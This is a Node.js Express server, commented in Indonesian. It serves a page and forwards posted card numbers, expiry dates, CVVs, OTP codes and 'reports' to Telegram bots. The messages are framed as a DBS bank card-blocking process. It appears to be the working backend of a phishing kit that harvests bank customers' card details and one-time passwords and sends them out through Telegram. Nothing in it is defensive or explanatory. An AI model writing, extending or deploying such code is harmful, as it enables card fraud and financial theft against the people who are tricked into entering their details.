const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const dotenv = require('dotenv');
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware untuk parsing JSON dan form
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ➕ Arahkan route '/' ke file HTML
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ⬇️ ROUTE untuk kirim data ke Telegram
app.post('/kirim-ke-telegram', async (req, res) => {
  console.log("Data diterima:", req.body);

  const { nomor, valid, cvv, otp, laporan } = req.body;

  let token;
  let message = "";

  if (otp) {
    token = process.env.BOT_TOKEN_OTP;
    message = `🔐 *Kode OTP Diterima*\n\n*OTP:* ${otp}`;
  } else if (nomor && valid && cvv) {
    token = process.env.BOT_TOKEN_BLOKIR;
    message = `🛑 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
  } else if (laporan) {
    token = process.env.BOT_TOKEN_LAPORAN;
    message = `📄 *Laporan Kartu Bank Lain*\n\n${laporan}`;
  } else {
    return res.status(400).send("Data tidak lengkap");
  }

  const chat_id = process.env.CHAT_ID;
  if (!token || !chat_id) {
    return res.status(500).send("Token atau Chat ID belum diatur");
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
    });

    if (response.ok) {
      res.sendStatus(200);
    } else {
      const error = await response.json();
      res.status(500).send("Gagal mengirim ke Telegram: " + JSON.stringify(error));
    }
  } catch (error) {
    res.status(500).send("Gagal: " + error.message);
  }
});

// ⬇️ Folder public untuk file statis
app.use(express.static(path.join(__dirname, 'public')));

// Jalankan server
app.listen(PORT, () => {
  console.log(`✅ Server aktif di http://localhost:${PORT}`);
});
